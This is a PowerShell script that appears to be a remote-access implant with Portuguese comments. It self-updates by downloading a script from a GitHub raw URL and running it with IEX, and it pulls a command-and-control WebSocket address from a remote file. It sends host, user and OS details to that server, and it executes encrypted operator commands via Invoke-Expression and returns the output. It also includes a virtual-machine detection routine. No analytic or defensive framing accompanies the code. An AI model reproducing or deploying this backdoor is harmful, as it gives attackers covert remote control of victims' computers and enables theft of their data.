$GITHUB_RAW_URL = "https://raw.githubusercontent.com/mxnxs19/x2/refs/heads/main/age.ps1"
$LINK_FILE_URL = "https://raw.githubusercontent.com/mxnxs19/x2/refs/heads/main/link.txt"
$AES_KEY_HEX = "00a22578d5d544d3cc3bf9d29c4ddd3"
$AGENT_ID = [System.Guid]::NewGuid().ToString().Substring(0,8)

# --- CONFIGURAÇÃO ---
$POLL_DELAY = 500
$RETRY_DELAY = 300

function Get-SysInfo {
    $info = @{
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        hostname = $env:COMPUTERNAME
        user = $env:USERNAME
        arch = $env:PROCESSOR_ARCHITECTURE
    }
    return $info
}

function Test-IsVM {
    $vmArtifacts = @("VBOX", "VMWARE", "VIRTUAL", "QEMU")
    $model = (Get-WmiObject Win32_ComputerSystem).Model.ToUpper()
    foreach ($art in $vmArtifacts) {
        if ($model.Contains($art)) { return $true }
    }
    return $false
}

function enc($p) {
    $k = [Convert]::FromHexString($AES_KEY_HEX)
    $n = New-Object byte[](12)
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($n)
    $c = New-Object System.Security.Cryptography.AesGcm($k)
    $ct = New-Object byte[]($p.Length)
    $tag = New-Object byte[](16)
    $c.Encrypt($n, $p, $null, $ct, $tag)
    $res = New-Object byte[](12 + 16 + $ct.Length)
    [Array]::Copy($n, 0, $res, 0, 12)
    [Array]::Copy($tag, 0, $res, 12, 16)
    [Array]::Copy($ct, 0, $res, 28, $ct.Length)
    return $res
}

function dec($b) {
    $k = [Convert]::FromHexString($AES_KEY_HEX)
    $n = $b[0..11]
    $tag = $b[12..27]
    $ct = $b[28..($b.Length - 1)]
    $c = New-Object System.Security.Cryptography.AesGcm($k)
    $pt = New-Object byte[]($ct.Length)
    $c.Decrypt($n, $ct, $tag, $pt)
    return $pt
}


while ($true) {
    try {
        # 1. Auto-Atualização
        try {
            $remoteScript = (Invoke-RestMethod -Uri $GITHUB_RAW_URL -UseBasicParsing -ErrorAction Stop)
            $currentScript = $MyInvocation.MyCommand.Definition
            if ($null -ne $currentScript) {
                $localHash = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($currentScript)))
                $remoteHash = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($remoteScript)))
                if ($localHash -ne $remoteHash) {
                    IEX $remoteScript
                    break
                }
            }
        } catch {}

        # 2. Obter URL do C2
        $c2Url = (Invoke-RestMethod -Uri $LINK_FILE_URL -UseBasicParsing).Trim()
        
        # 3. Conectar WebSocket
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ct = New-Object System.Threading.CancellationToken
        $ws.ConnectAsync($c2Url, $ct).Wait()
        
        # 4. Identificação com Info do Sistema
        $sysInfo = Get-SysInfo
        $hello = @{ id = $AGENT_ID; info = $sysInfo } | ConvertTo-Json
        $buf = [System.Text.Encoding]::UTF8.GetBytes($hello)
        $ws.SendAsync([System.ArraySegment[byte]]::new($buf), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
        
        # 5. Loop de Comandos
        $receiveBuf = New-Object byte[](65536)
        while ($ws.State -eq 'Open') {
            $segment = [System.ArraySegment[byte]]::new($receiveBuf)
            $result = $ws.ReceiveAsync($segment, $ct).Result
            
            if ($result.Count -gt 0) {
                $encryptedCmd = [System.Text.Encoding]::UTF8.GetString($receiveBuf, 0, $result.Count)
                $cmdBytes = dec([System.Convert]::FromBase64String($encryptedCmd))
                $cmd = [System.Text.Encoding]::UTF8.GetString($cmdBytes)
                
                if ($cmd -eq "die") { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closed by operator", $ct).Wait(); exit }
                
                $output = ""
                try {
                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                } catch {
                    $output = $_.Exception.Message
                }
                
                if ([string]::IsNullOrEmpty($output)) { $output = " " }
                
                $respBytes = enc([System.Text.Encoding]::UTF8.GetBytes($output))
                $ws.SendAsync([System.ArraySegment[byte]]::new($respBytes), [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $ct).Wait()
            }
            Start-Sleep -Seconds 2
        }
    }
    catch {
        Start-Sleep -Seconds $RETRY_DELAY
    }
    Start-Sleep -Seconds $POLL_DELAY
}
